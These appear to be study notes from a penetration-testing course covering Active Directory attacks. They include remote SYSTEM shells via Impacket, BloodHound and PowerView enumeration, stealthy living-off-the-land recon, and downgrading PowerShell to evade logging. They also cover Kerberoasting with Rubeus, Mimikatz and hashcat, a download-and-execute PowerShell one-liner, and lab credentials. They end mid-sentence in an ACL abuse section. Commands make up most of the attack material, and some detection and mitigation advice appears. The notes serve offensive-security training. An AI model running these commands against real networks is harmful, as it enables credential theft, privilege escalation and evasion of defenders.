#### **Explanation of SID and RID**
- Domain SID: `S-1-5-21-<unique domain identifier>`.
- User SID: Combines Domain SID with RID (e.g., `S-1-5-21-<unique domain ID>-1111`).


### **Using Impacket Toolkit**

#### **psexec.py**
-  Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the ADMIN$ share on the target host. It then registers the service via RPC and the Windows Service Control Manager. Once established, communication happens over a named pipe, providing an interactive remote shell as SYSTEM on the victim host.
- **Usage**:
  ```bash
  psexec.py [domain/user]:[password]@[target]
  ```
- Example:
  ```bash
  psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
  ```
- **Output**: Shell prompt with SYSTEM privileges on the target.

#### **wmiexec.py**
- Executes commands via Windows Management Instrumentation (WMI).
- **Usage**:
  ```bash
  wmiexec.py [domain/user]:[password]@[target]
  ```
- Example:
  ```bash
  wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
  ```
 this shell environment is not fully interactive, so each command issued will execute a new cmd.exe from WMI and execute your command. The downside of this is that if a vigilant defender checks event logs and looks at event ID 4688: A new process has been created, they will see a new process created to spawn cmd.exe and issue a command.


### **Using Windapsearch**
`windapsearch.py` performs LDAP queries to enumerate AD information.

#### **Help Menu**
```bash
python3 /opt/windapsearch/windapsearch.py -h
```

#### **Enumerate Domain Admins**
```bash
python3 /opt/windapsearch/windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```
- **Output**: Lists members of the `Domain Admins` group.

#### **Enumerate Privileged Users**
```bash
python3 /opt/windapsearch/windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```
- **Output**: Identifies privileged users, including those with nested group membership.



### **Tips for Effective Enumeration**
- **Save Outputs**: Redirect results to files for better analysis.
- **Combine Tools**: Use results from `rpcclient` with `windapsearch` or Impacket tools to correlate data.
- **Focus on Privileged Accounts**: Pay special attention to `Domain Admins`, nested group memberships, and service accounts.

## Bloodhound

**Introduction to BloodHound**
- **Purpose**: BloodHound is a powerful tool for auditing Active Directory security by creating graphical representations of access paths.
- **Components**: 
  - SharpHound collector (C# for Windows)
  - BloodHound.py collector (Python for Linux)
  - BloodHound GUI for data visualization and query execution

### Setting Up BloodHound.py
**Prerequisites**: Requires Impacket, ldap3, and dnspython.

### Running BloodHound.py
```bash
bloodhound-python -h

# Output shows various options:
# -h, --help            show this help message and exit
# -c COLLECTIONMETHOD, --collectionmethod COLLECTIONMETHOD
# -u USERNAME, --username USERNAME
# -p PASSWORD, --password PASSWORD
```
- **Collection Methods**:
  - Group, LocalAdmin, Session, Trusts, Default (all previous), DCOnly (no computer connections), DCOM, RDP, PSRemote, LoggedOn, ObjectProps, ACL, All (all except LoggedOn)

### Executing BloodHound.py with Domain Credentials
```bash
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 

# Example output:
# INFO: Found AD domain: inlanefreight.local
# INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
# INFO: Found 1 domains
# INFO: Found 2 domains in the forest
# INFO: Found 564 computers
# INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
# INFO: Found 2951 users
# INFO: Found 183 groups
# INFO: Found 2 trusts
# INFO: Starting computer enumeration with 10 workers
```
- **Explanation**: This command runs all checks using the specified domain credentials and domain controller.

### Viewing the Results
```bash
ls

# Output will show:
# 20220307163102_computers.json  
# 20220307163102_domains.json  
# 20220307163102_groups.json  
# 20220307163102_users.json
```
- **Explanation**: The output files are JSON files containing the collected data.

### Uploading Data to BloodHound GUI
1. **Start the Neo4j service**:
   ```bash
   sudo neo4j start
   ```
2. **Start BloodHound GUI**:
   ```bash
   bloodhound
   ```
   - **Credentials**: 
     - User: `neo4j`
     - Password: `HTB_@cademy_stdnt!`

3. **Upload Data**:
   ```bash
   zip -r ilfreight_bh.zip *.json
   ```
   - **Upload the Zip file** using the "Upload Data" button in the BloodHound GUI.

### Running Queries in BloodHound
- **Built-in Queries**: Use the Analysis tab to run pre-built queries.
- **Custom Cypher Queries**: Use custom Cypher queries for specific analysis.

### Example Query: Finding Shortest Paths to Domain Admins
- **Path Finding Queries**: Useful for identifying paths to escalate privileges to Domain Administrator.

**Exploring BloodHound GUI Features**:
- **Database Info Tab**: View detailed information about the database.
- **Node Info Tab**: Search for specific nodes like Domain Users.
- **Settings Menu**: Adjust how nodes and edges are displayed, enable query debug mode, and enable dark mode.
---

# Credential enumeration from Windows

This section explains the tools and commands for enumerating Active Directory (AD) environments from a **Windows attack host**. It includes key details, examples, and their relevance during an assessment, focusing on real-world scenarios.



## **1. ActiveDirectory PowerShell Module**

The **ActiveDirectory PowerShell Module** is a built-in PowerShell toolset for interacting with AD environments. It is particularly useful for stealthy enumeration as it blends with administrative tasks.

### **Setup**
- **Verify if the module is imported:**
  ```powershell
  Get-Module
  ```
  - Lists all loaded modules. If the `ActiveDirectory` module is not present, it needs to be imported.
  - **Use Case:** This check ensures the module is ready for use and helps find any pre-installed custom scripts or tools.

- **Import the module:**
  ```powershell
  Import-Module ActiveDirectory
  ```
  - Loads the `ActiveDirectory` cmdlets into the current session.



### **Key Commands for Enumeration**

#### **1.1 Get Domain Information**
```powershell
Get-ADDomain
```
- **Purpose:** Displays foundational details about the domain, such as:
  - Domain SID
  - Domain functional level (e.g., Windows Server 2016 or 2019)
  - Child domains
- **Importance:** Understanding the domain structure and functional level helps assess potential attack paths and compatibility for exploitation techniques.



#### **1.2 Identify Kerberoasting Targets**
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
- **Purpose:** Finds user accounts with the `ServicePrincipalName (SPN)` attribute set, which indicates they may be vulnerable to **Kerberoasting**.
  - Kerberoasting: A method of extracting service account credentials from the Kerberos authentication process.
- **Importance:** These accounts often have elevated privileges and are high-value targets.



#### **1.3 Enumerate Domain Trust Relationships**
```powershell
Get-ADTrust -Filter *
```
- **Purpose:** Lists trust relationships between the current domain and other domains.
  - **Details Provided:**
    - Trust type (e.g., external, parent-child, or forest)
    - Direction of trust (incoming, outgoing, or bidirectional)
    - Trusting domain names
- **Importance:** Domain and forest trusts allow lateral or vertical movement across domains, making them critical to document during engagements.



#### **1.4 Enumerate Groups**
- **List all groups:**
  ```powershell
  Get-ADGroup -Filter * | Select-Object Name
  ```
  - Outputs a complete list of groups in the domain.

- **Detailed information for a specific group:**
  ```powershell
  Get-ADGroup -Identity "Group Name"
  ```
  - **Details Provided:** Group properties like `description`, `group scope`, and `managed by`.
  - **Example Use Case:** Use this to understand the purpose and role of a sensitive group (e.g., Backup Operators).

- **List group members:**
  ```powershell
  Get-ADGroupMember -Identity "Group Name"
  ```
  - Outputs users or nested groups that are members of the specified group.
  - **Relevance:** Helps identify accounts with high privileges (e.g., members of the Domain Admins group).



### **Key Observations**
- **Recursive Group Membership:** Some groups are part of others, creating nested privileges. Use group membership enumeration to find hidden relationships, e.g.,:
  ```powershell
  Get-ADGroupMember -Identity "Domain Admins" -Recurse
  ```
  - **Importance:** Identifies users/groups indirectly inheriting high privileges (e.g., through nested membership).

- **Backup Operators Group:** Membership in this group could allow access to system backups, enabling privilege escalation.


## **2. PowerView**

**PowerView** is a powerful, open-source PowerShell toolkit for AD enumeration. It is part of the deprecated **PowerSploit** suite but remains highly effective. It offers more automation and functionality than the `ActiveDirectory` module.


### **Key Commands in PowerView**

#### **2.1 Enumerate Domain Users**
```powershell
Get-DomainUser -Identity username
```
- **Purpose:** Fetches information about a specific user, including:
  - `samaccountname`, `description`, `memberof`, `whencreated`, `pwdlastset`, etc.
- **Relevance:** Provides a detailed profile of users, including when their passwords were last set and whether their accounts are administrative.

#### **2.2 Enumerate Group Memberships**
```powershell
Get-DomainGroupMember -Identity "Group Name" -Recurse
```
- **Purpose:** Lists all members of a specific group, including nested groups.



#### **2.3 Identify Trust Relationships**
```powershell
Get-DomainTrustMapping
```
- **Purpose:** Displays domain trust relationships, similar to `Get-ADTrust`.



#### **2.4 Local Admin Enumeration**
```powershell
Test-AdminAccess -ComputerName HOSTNAME
```
- **Purpose:** Checks if the current user has administrative privileges on a specified computer.
- **Relevance:** Identifies potential hosts for lateral movement or privilege escalation.



#### **2.5 File and Share Enumeration**
- **Enumerate Shares:**
  ```powershell
  Find-DomainShare
  ```
  - Finds accessible shares within the domain.

- **Search for sensitive files in shares:**
  ```powershell
  Find-InterestingDomainShareFile
  ```
  - Automates the search for files with names indicating sensitive data (e.g., files containing `password` or `config`).


## **3. SharpView**

**SharpView** is a .NET port of PowerView. It offers similar functionality while bypassing PowerShell-specific restrictions. SharpView can be particularly effective when PowerShell scripts are heavily monitored.

### **Examples**
- **User Enumeration:**
  ```powershell
  .\SharpView.exe Get-DomainUser -Identity username
  ```
- **Help Functionality:**
  ```powershell
  .\SharpView.exe Get-DomainUser -Help
  ```



## **4. Snaffler**

**Snaffler** automates the discovery of sensitive data in shared directories. It is efficient for large environments.

### **Example Usage**
```bash
Snaffler.exe -d DOMAIN -s -o output.log -v data
```
- **Key Options:**
  - `-d`: Specifies the domain to search.
  - `-s`: Prints results to the console.
  - `-o`: Outputs results to a log file.
  - `-v`: Sets verbosity level (e.g., `data`).

- **Relevance:** Locates sensitive files such as configuration files, SSH keys, and plaintext passwords.


## **5. BloodHound**

**BloodHound** visualizes AD relationships and identifies attack paths by analyzing SharpHound-collected data.

### **Steps:**
1. **Data Collection:**
   ```powershell
   .\SharpHound.exe -c All --zipfilename OUTPUT_NAME
   ```
2. **Upload Data:**
   - Import the `.zip` file into the BloodHound GUI.

3. **Run Pre-Built Queries:**
   - **Find Unsupported Operating Systems:** Locates outdated systems vulnerable to exploitation (e.g., Windows 7).
   - **Domain Users with Local Admin Rights:** Reveals hosts where `Domain Users` have administrative privileges.


### **Best Practices and Reporting**

1. **Documentation:**
   - Maintain detailed notes of findings, including command outputs and logs.
   - Provide supplemental data like Snaffler logs to clients.

2. **Cleanup:**
   - Remove tools and artifacts introduced during assessments.
   - Ensure actions comply with the agreed-upon scope.

3. **Recommendations:**
   - Restrict overly permissive shares.
   - Limit legacy systems' exposure or recommend decommissioning.
   - Minimize administrative privileges to essential personnel only.

---

# Living OFF the Land

When traditional methods fail, "living off the land" utilizes native Windows tools and commands for stealthier enumeration. This approach minimizes log entries, reduces the chance of detection by monitoring tools, and aligns with scenarios where uploading external tools isn't feasible.

### **Scenario**
- Client request: Test AD environment from a managed host with no internet and no external tool uploads.
- Goal: Identify possible enumeration activities using only built-in tools, avoiding alerts from monitoring systems such as IDS/IPS or enterprise EDR.
- Strategy: Use native Windows utilities to explore the host and network configurations, maintain stealth, and minimize defender-triggered responses.



### **Host and Network Recon: Key Commands**

#### **Basic Enumeration Commands**
| Command                                   | Description                                                                                   |
|-------------------------------------------|-----------------------------------------------------------------------------------------------|
| `hostname`                                | Displays the PC's name.                                                                       |
| `[System.Environment]::OSVersion.Version` | Prints the OS version and revision level.                                                    |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Lists applied patches and hotfixes.                                                           |
| `ipconfig /all`                           | Outputs network adapter configurations.                                                      |
| `set`                                     | Displays environment variables for the current session.                                       |
| `echo %USERDOMAIN%`                       | Prints the domain name of the host.                                                          |
| `echo %logonserver%`                      | Shows the name of the domain controller the host checks in with.                             |
| `systeminfo`                              | Provides a summary of host information in one tidy output (e.g., OS, domain, network details).|


### **Harnessing PowerShell for Advanced Recon**
PowerShell offers extensive capabilities for system and network reconnaissance.

#### **Essential PowerShell Cmdlets**
| Cmdlet                                             | Description                                                                                     |
|----------------------------------------------------|-------------------------------------------------------------------------------------------------|
| `Get-Module`                                       | Lists available modules.                                                                        |
| `Get-ExecutionPolicy -List`                        | Displays execution policies by scope.                                                          |
| `Set-ExecutionPolicy Bypass -Scope Process`        | Temporarily bypasses execution policy for the current session.                                  |
| `Get-ChildItem Env: | ft Key,Value`                | Lists environment variables with keys and values.                                               |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Retrieves PowerShell history for potential insights (e.g., scripts or passwords).               |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <commands>"` | Downloads and executes content directly in memory (if internet access is available).            |



### **Downgrading PowerShell for Stealth**
- **Rationale**: Versions prior to PowerShell 3.0 lack advanced logging features, such as Script Block Logging.
- **Steps**:
  1. Verify current version with `Get-Host`.
  2. Downgrade: `powershell.exe -version 2`.
  3. Confirm with `Get-Host` (Version should display `2.0`).

#### **Caveat**:
- Actions to downgrade (e.g., `powershell.exe -version 2`) are logged, but subsequent activity in version 2.0 is not.



### **Checking Host Defenses**
#### **Firewall Configuration**
- **Command**: `netsh advfirewall show allprofiles`
- **Key Insights**:
  - State: ON/OFF for domain, private, and public profiles.
  - Policies: Inbound/Outbound traffic rules.
  - Logging: Status of allowed/dropped connections.

#### **Windows Defender Status**
1. **Service Check** (CMD):
   - `sc query windefend`  
   - Checks if the Windows Defender service is running.
2. **Configuration Details** (PowerShell):
   - `Get-MpComputerStatus`  
   - Displays detailed Defender settings (e.g., real-time protection, signature versions, scanning schedules).



### **Am I Alone?**
- **Command**: `qwinsta`
- **Purpose**: Lists active user sessions to ensure actions won’t alert a logged-in user.
- **Output Example**:
  - `SESSIONNAME`: Console or remote session type.
  - `USERNAME`: Active user(s).


### **Network Enumeration**
#### **Key Networking Commands**
| Command               | Description                                                                                     |
|-----------------------|-------------------------------------------------------------------------------------------------|
| `arp -a`              | Lists ARP table entries (known hosts).                                                         |
| `ipconfig /all`       | Details network adapter configurations (e.g., IP, DNS, gateway).                               |
| `route print`         | Displays IPv4/IPv6 routing table (known routes to networks).                                   |
| `netsh advfirewall show allprofiles` | Displays firewall configuration settings.                                                |

#### **Analyzing ARP and Routing**
- **ARP Table (`arp -a`)**:
  - Identifies IP and MAC addresses of connected hosts.
  - Helps locate potential target devices.
- **Routing Table (`route print`)**:
  - Reveals known networks and possible lateral movement paths.
  - Persistent routes can indicate administratively-set paths or frequent access points.



### **Windows Management Instrumentation (WMI) and Domain Enumeration Techniques**

#### **WMI Overview**
WMI is a powerful scripting engine used in Windows environments for administrative tasks and information retrieval. It enables local and remote queries about users, groups, processes, and system configurations, making it invaluable for enumeration tasks.



### **WMI Commands**
| **Command** | **Description** |
|-------------|------------------|
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Lists applied patches and hotfixes. |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic system details. |
| `wmic process list /format:list` | Lists all running processes. |
| `wmic ntdomain list /format:list` | Provides details about the domain and domain controllers. |
| `wmic useraccount list /format:list` | Outputs all local and logged-in domain accounts. |
| `wmic group list /format:list` | Lists local groups. |
| `wmic sysaccount list /format:list` | Dumps service account information. |



### **Net Commands**
Net commands provide information about users, groups, and domain settings. They are versatile but may trigger alerts in monitored environments.

| **Command** | **Description** |
|-------------|------------------|
| `net accounts` | Displays local password policy. |
| `net accounts /domain` | Shows domain password and lockout policy. |
| `net group /domain` | Lists domain groups. |
| `net group "Domain Admins" /domain` | Lists users in the "Domain Admins" group. |
| `net user <ACCOUNT_NAME> /domain` | Retrieves details about a specific domain user. |
| `net user /domain` | Lists all domain users. |
| `net localgroup administrators /domain` | Displays members of the "Administrators" group. |
| `net view /domain` | Lists PCs in the domain. |
| `net view \computer /ALL` | Shows all shares on a specific computer. |

#### **Key Notes**:
- Use `net1` as a stealthy alternative to `net` commands in monitored environments.


### **Dsquery Commands**
`dsquery` enables Active Directory (AD) object searches. It's available on hosts with the AD Domain Services role and uses built-in DLLs.

| **Command** | **Description** |
|-------------|------------------|
| `dsquery user` | Lists all users in AD. |
| `dsquery computer` | Outputs all computers in AD. |
| `dsquery * "CN=Users,DC=DOMAIN,DC=LOCAL"` | Searches a specific OU for all objects. |
| `dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl` | Finds users with the `PASSWD_NOTREQD` flag set. |
| `dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName` | Lists five domain controllers in the current domain. |

#### **Search Customization**:
- Use LDAP filters (`objectClass=user`, etc.) with logical operators:
  - **&**: AND (`(&(criteria1)(criteria2))`).
  - **|**: OR (`(|(criteria1)(criteria2))`).
  - **!**: NOT (`(!criteria)`).

#### **Common LDAP Matching Rules**:
1. **`1.2.840.113556.1.4.803`**: Matches specific bit values exactly.
2. **`1.2.840.113556.1.4.804`**: Matches any bit in a chain.
3. **`1.2.840.113556.1.4.1941`**: Matches Distinguished Names across ownership/membership.

#### **Example Filters**:
- Search for users with **Password Can't Change**:  
  `(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`
- Exclude users with **Password Can't Change**:  
  `(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`


### **UserAccountControl (UAC) Values and Their Corresponding Attributes**

The **UserAccountControl (UAC)** attribute in Active Directory defines specific properties of user accounts. These properties are stored as a bitmask, and each value corresponds to a particular attribute. The values can combine to represent multiple attributes simultaneously.

| **Value** | **Attribute**                                         | **Description**                                                                                   |
|-----------|-------------------------------------------------------|---------------------------------------------------------------------------------------------------|
| `2`       | **ACCOUNTDISABLE**                                    | The account is disabled.                                                                          |
| `8`       | **HOMEDIR_REQUIRED**                                  | A home directory is required.                                                                    |
| `16`      | **LOCKOUT**                                           | The account is locked out.                                                                       |
| `32`      | **PASSWD_NOTREQD**                                    | The account does not require a password.                                                         |
| `64`      | **PASSWD_CANT_CHANGE**                                | The user cannot change the password.                                                             |
| `128`     | **ENCRYPTED_TEXT_PWD_ALLOWED**                        | The account allows the storage of a reversible encrypted password.                               |
| `512`     | **NORMAL_ACCOUNT**                                    | A typical user account.                                                                          |
| `2048`    | **INTERDOMAIN_TRUST_ACCOUNT**                         | A domain trust account.                                                                          |
| `4096`    | **WORKSTATION_TRUST_ACCOUNT**                         | A computer account for a workstation or server.                                                  |
| `8192`    | **SERVER_TRUST_ACCOUNT**                              | A domain controller account.                                                                     |
| `65536`   | **DONT_EXPIRE_PASSWORD**                              | The password is set not to expire.                                                               |
| `131072`  | **SMARTCARD_REQUIRED**                                | The account requires a smart card for login.                                                     |
| `262144`  | **TRUSTED_FOR_DELEGATION**                            | The account is trusted for delegation.                                                           |
| `524288`  | **NOT_DELEGATED**                                     | The account cannot be delegated.                                                                 |
| `1048576` | **USE_DES_KEY_ONLY**                                  | The account is restricted to use only DES encryption types for keys.                             |



### **Combining UAC Values**
- UAC values can combine to represent multiple properties. For example:
  - A disabled account (`2`) that does not require a password (`32`) would have a UAC value of `34` (`2 + 32`).
    
---

# Kerberoasting from Linux:

#### **Overview**
Kerberoasting is a **lateral movement and privilege escalation technique** targeting Service Principal Names (SPNs) in Active Directory (AD). SPNs link services to service accounts, often requiring domain credentials for authentication. By requesting Kerberos service tickets (TGS-REPs), attackers can extract encrypted ticket data offline to attempt brute-force password cracking.


### **Core Concepts**
1. **SPNs and Their Role in Kerberos**:
   - SPNs uniquely identify a service instance running under a domain account.
   - Service accounts often have elevated privileges (e.g., local or domain admin).

2. **The Attack Workflow**:
   - Any domain user can request a TGS ticket for any SPN.
   - The TGS-REP ticket is encrypted with the service account’s NTLM hash.
   - Offline cracking of the TGS-REP can reveal the cleartext password.

3. **Common Weaknesses Exploited**:
   - Weak or reused passwords on service accounts.
   - Privileged service accounts with SPNs (e.g., SQL Server, SolarWinds).
   - Misconfigured SPNs linked to domain or enterprise administrator accounts.

4. **Potential Outcomes**:
   - **High Impact**: Privileged accounts like `Domain Admins` compromised.
   - **Low Impact**: Cracked passwords grant limited access but may help pivot within the domain.



### **Key Tools for Kerberoasting from Linux**
1. **Impacket Toolkit**:
   - Provides tools like `GetUserSPNs.py` to enumerate SPNs and request TGS tickets.
   - Can be used with domain credentials or NTLM hashes.

2. **Hashcat**:
   - Crack TGS tickets offline using GPU-powered password recovery.

3. **Additional Utilities**:
   - `crackmapexec`: Validate cracked credentials.
   - `rockyou.txt` or other password wordlists for brute-force attacks.


### **Steps for Performing Kerberoasting on Linux**

#### **1. Install Impacket**
```bash
 sudo python3 -m pip install .
```
- Installs Impacket's tools in the system's PATH for easy access.



#### **2. Enumerate SPNs with Valid Credentials**
Command:
```bash
 GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USERNAME>
```

Example Output:
| ServicePrincipalName                          | Name             | MemberOf              | PasswordLastSet   |
|-----------------------------------------------|------------------|-----------------------|-------------------|
| `backupjob/veam001.inlanefreight.local`       | `BACKUPAGENT`    | `Domain Admins`       | `2022-02-15`      |
| `sts/inlanefreight.local`                     | `SOLARWINDSMONITOR` | `Domain Admins`     | `2022-02-15`      |



#### **3. Request TGS Tickets**
Command:
```bash
 GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USERNAME> -request
```
Output includes SPNs and encrypted TGS tickets (e.g., `$krb5tgs$23$...`).


#### **4. Save Tickets to a File for Cracking**
Command:
```bash
 GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USERNAME> -request -outputfile <FILE>
```



#### **5. Crack TGS Tickets with Hashcat**
Command:
```bash
 hashcat -m 13100 <FILE> /usr/share/wordlists/rockyou.txt
```

Example Cracked Password:
```plaintext
$krb5tgs$23$...:database!
```



#### **6. Test Access with Cracked Credentials**
Command:
```bash
 sudo crackmapexec smb <DC-IP> -u <USERNAME> -p <PASSWORD>
```

Example Output:
```plaintext
SMB         172.16.5.5      445    <DC_NAME>  [+] <DOMAIN>\<USERNAME>:<PASSWORD> (Pwn3d!)
```

---

# Kerberoasting: Windows

Kerberoasting is a post-exploitation technique used to extract and crack Kerberos tickets for sensitive service accounts in a Windows domain. Below is a detailed guide, providing both context and explanations for the commands involved in semi-manual and automated approaches.



### **1. Overview of Kerberoasting**
- **Purpose**: 
  - Retrieve Kerberos Ticket Granting Service (TGS) tickets for accounts with SPNs.
  - Crack the encrypted tickets offline to reveal plaintext passwords.
- **Prerequisites**:
  - A foothold in the target domain (valid credentials for a domain account).
  - Permission to request TGS tickets, which any authenticated domain user typically has.


### **2. Semi-Manual Method for Kerberoasting**

This approach is helpful when automated tools are unavailable or blocked. It combines built-in Windows tools and manual extraction methods.



#### **Step 1: Enumerate Service Principal Names (SPNs)**
- Use `setspn.exe` (a built-in Windows binary) to query the domain for SPNs.

```shell
 setspn.exe -Q */*
```

- **Explanation**:
  - The `-Q` flag queries for SPNs matching the wildcard `*/*`, which lists all SPNs in the domain.
  - SPNs are unique identifiers for services running under specific accounts (e.g., `MSSQLSvc`, `backupjob`).
  - Output includes **user accounts** and **computer accounts**. Focus on user accounts as these can have weak passwords.


#### **Step 2: Request TGS Tickets Using PowerShell**
- Request a TGS ticket for a specific SPN.

```powershell
 Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

- **Context and Explanation**:
  1. **Add-Type**: Loads the `.NET Framework` library into the PowerShell session, enabling access to advanced Kerberos classes.
     - **`System.IdentityModel`**: Namespace that includes Kerberos-related classes.
  2. **New-Object**:
     - Creates a `KerberosRequestorSecurityToken` object, requesting a TGS ticket for the specified SPN (`MSSQLSvc/DEV-PRE-SQL`).
     - The ticket is loaded into memory for further processing.


#### **Step 3: Extract Tickets from Memory with Mimikatz**
- Dump the loaded TGS tickets using Mimikatz.

```shell
mimikatz # kerberos::list /export
```

- **Explanation**:
  - The `kerberos::list` command lists all Kerberos tickets in memory.
  - The `/export` flag saves each ticket as a `.kirbi` file on disk.
  - These `.kirbi` files are encrypted but can be cracked offline.



#### **Step 4: Prepare Tickets for Cracking**
1. **Convert Base64-Encoded Tickets to .kirbi**:
   - If the ticket was exported in Base64 format, convert it to `.kirbi`.
   ```bash
   echo "<base64 blob>" | tr -d \\n | base64 -d > sqldev.kirbi
   ```
   - **Explanation**: This command removes line breaks and decodes the Base64 string into the `.kirbi` binary format.

2. **Extract Hashes for Cracking**:
   - Use `kirbi2john.py` to extract the Kerberos hash from the `.kirbi` file.
   ```bash
   python2.7 kirbi2john.py sqldev.kirbi > crack_file
   ```

3. **Format the Hash for Hashcat**:
   - Modify the extracted hash for compatibility with `hashcat`:
   ```bash
   sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
   ```

4. **Crack the Hash**:
   - Use `hashcat` to brute-force the hash offline:
   ```bash
   hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
   ```

- **Hashcat Context**:
  - **`-m 13100`**: Hashcat mode for cracking Kerberos 5 TGS-REP hashes using RC4 encryption.
  - **Wordlist**: A file like `rockyou.txt` is used for dictionary-based brute-forcing.



### **3. Automated Methods for Kerberoasting**

Automated tools simplify Kerberoasting by combining enumeration, ticket requests, and hash extraction into fewer steps.



#### **Using PowerView**
1. **Import PowerView Module**:
   - Load the PowerView script into the PowerShell session:
   ```powershell
    Import-Module .\PowerView.ps1
   ```

2. **Enumerate SPNs**:
   - List all SPN-enabled user accounts in the domain:
   ```powershell
    Get-DomainUser * -spn | select samaccountname
   ```

3. **Retrieve Tickets**:
   - Request a TGS ticket for a specific account and format it for `hashcat`:
   ```powershell
    Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
   ```

4. **Export All Tickets**:
   - Export tickets for all SPN-enabled accounts to a CSV file for offline processing:
   ```powershell
    Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
   ```



#### **Using Rubeus**
1. **Basic Kerberoasting**:
   - Request all TGS tickets in the domain:
   ```powershell
    .\Rubeus.exe kerberoast /nowrap
   ```
   - **Explanation**:
     - `/nowrap`: Ensures Base64 ticket blobs are not wrapped across multiple lines.

2. **Target Specific SPNs**:
   - Request a TGS ticket for a specific SPN:
   ```powershell
    .\Rubeus.exe kerberoast /spn:"MSSQLSvc/SQLSERVER"
   ```

3. **Filter by Admin Accounts**:
   - Target high-value accounts with the `admincount` attribute set:
   ```powershell
    .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
   ```

4. **View Statistics**:
   - View the encryption types and password last set dates for Kerberoastable accounts:
   ```powershell
    .\Rubeus.exe kerberoast /stats
   ```


### **1. Encryption Types in Kerberoasting**

#### **Encryption Type Overview**
- **RC4 (etype 23)**:
  - Easier and faster to crack.
  - Most Kerberoasting tools default to requesting RC4-encrypted tickets.
- **AES (etype 17/18)**:
  - AES-128 (etype 17) and AES-256 (etype 18) are much harder to crack due to stronger encryption.
  - Cracking AES-encrypted tickets requires significantly more resources and time.

#### **Example: Checking Encryption Type with PowerView**
```powershell
 Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

- **Output**:
  - **msds-supportedencryptiontypes = 0**: Defaults to RC4 encryption.
  - **msds-supportedencryptiontypes = 24**: Supports AES-128/256 encryption only.



### **2. Key Commands for Kerberoasting**

#### **Retrieve Tickets with RC4 Encryption**
- Use **Rubeus** to request TGS tickets for a target SPN account:
```powershell
 .\Rubeus.exe kerberoast /user:testspn /nowrap
```

- **Output**:
  - The hash will begin with `$krb5tgs$23$*`, indicating RC4 encryption.

#### **Retrieve AES-Encrypted Tickets**
- If the SPN account supports AES, tickets will begin with `$krb5tgs$18$*` (AES-256) or `$krb5tgs$17$*` (AES-128).


### **3. Cracking Kerberos Hashes**

#### **For RC4-Encrypted Tickets**
- Crack with Hashcat (etype 23, TGS-REP):
```bash
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
```

#### **For AES-Encrypted Tickets**
- Crack with Hashcat (etype 18, TGS-REP for AES-256):
```bash
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```


### **4. Downgrading to RC4 Encryption**
- Use Rubeus to force RC4 encryption for accounts that support AES:
```powershell
PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /tgtdeleg /nowrap
```
- **Note**: This method doesn’t work against Windows Server 2019 DCs, which enforce the highest available encryption type.



### **5. Detection and Mitigation**

#### **Detection**
1. **Enable Logging for Kerberos Service Ticket Operations**:
   - Group Policy → `Audit Kerberos Service Ticket Operations`.
2. **Monitor Event Logs**:
   - **Event ID 4769**: Kerberos service ticket was requested.
   - **Event ID 4770**: Kerberos service ticket was renewed.
   - High volume of 4769 logs in a short time may indicate Kerberoasting.

#### **Example Log Indicators**:
- **Ticket Encryption Type**:
  - **0x17**: RC4 encryption was used.
  - **0x12**: AES-256 encryption was used.
- **User Information**:
  - Logs may show the attacker (e.g., `htb-student`) requesting tickets for target accounts (e.g., `sqldev`).



#### **Mitigation Strategies**
1. **Strong Passwords**:
   - Use long, complex passwords for service accounts.
   - Avoid using dictionary words or weak phrases.
2. **Managed Service Accounts**:
   - Use **Managed Service Accounts (MSA)** or **Group Managed Service Accounts (gMSA)** with automatic password rotation.
3. **Restrict RC4 Encryption**:
   - Update Group Policy to remove RC4_HMAC_MD5 from allowed Kerberos encryption types.
   - Test extensively before implementing to prevent operational issues.
4. **Limit SPN Accounts**:
   - Avoid assigning SPNs to high-privileged accounts like Domain Admins.

---

# Access Control List (ACL) Abuse Primer

### **Overview of ACLs**
- **ACLs** define who has access to assets/resources and the level of access granted in Active Directory (AD).
- **Access Control Entries (ACEs)**: These are the settings in an ACL, mapping users, groups, or processes to specific rights over objects in AD.
- **Types of ACLs**:
